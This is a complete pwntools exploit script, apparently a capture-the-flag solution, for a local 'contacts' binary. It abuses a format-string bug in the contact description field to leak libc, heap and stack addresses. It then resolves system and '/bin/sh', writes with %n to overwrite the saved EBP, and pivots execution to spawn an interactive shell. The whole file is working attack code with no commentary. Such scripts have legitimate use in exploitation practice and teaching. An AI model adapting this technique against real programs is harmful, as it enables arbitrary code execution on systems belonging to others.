from pwn import*
from LibcSearcher import*
p = process('./contacts')
elf = ELF('./contacts')
#context.log_level = 'debug'

def CreateContact(name, phone, descrip_len, description):
	p.recvuntil('>>> ')
	p.sendline('1')
	p.recvuntil('Contact info: \n')
	p.recvuntil('Name: ')
	p.sendline(name)
	p.recvuntil('You have 10 numbers\n')
	p.sendline(phone)
	p.recvuntil('Length of description: ')
	p.sendline(descrip_len)
	p.recvuntil('description:\n\t\t')
	p.sendline(description)

def PrintContact():
	p.recvuntil('>>> ')
	p.sendline('4')
	p.recvuntil('Contacts:')
	p.recvuntil('Description: ')

#Get the libc version
payload = '%31$pEND'
CreateContact('First','12345','20',payload)
PrintContact()
libc_start_main_ret = int(p.recvuntil('END',drop = True),16)
log.success('Libc_start_main_ret Addr:'+hex(libc_start_main_ret))
libc = LibcSearcher('__libc_start_main_ret',libc_start_main_ret)
libcbase = libc_start_main_ret - libc.dump('__libc_start_main_ret')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
log.success('System_Addr:'+hex(system_addr))
log.success('Binsh_Addr:'+hex(binsh_addr))

#Get the Heap_Addr and EBP_Addr
payload = flat([system_addr,'UUUU',binsh_addr,'START%6$pM%11$pEND'])
CreateContact('Second','12345','32',payload)
PrintContact()
p.recvuntil('START')
ebp_addr = int(p.recvuntil('M',drop = True),16)
heap_addr = int(p.recvuntil('END',drop = True),16)
log.success('Heap_Addr:'+hex(heap_addr))
log.success('EBP_Addr:'+hex(ebp_addr))

#Modify the EBP
Pone = (heap_addr - 4) / 2
Ptwo = heap_addr - 4 - Pone
payload = '%' + str(Pone) + 'x%' + str(Ptwo) + 'x%6$n'
CreateContact('Third','12345','40',payload)
PrintContact()
p.sendlineafter('>>> ','5')
p.interactive()
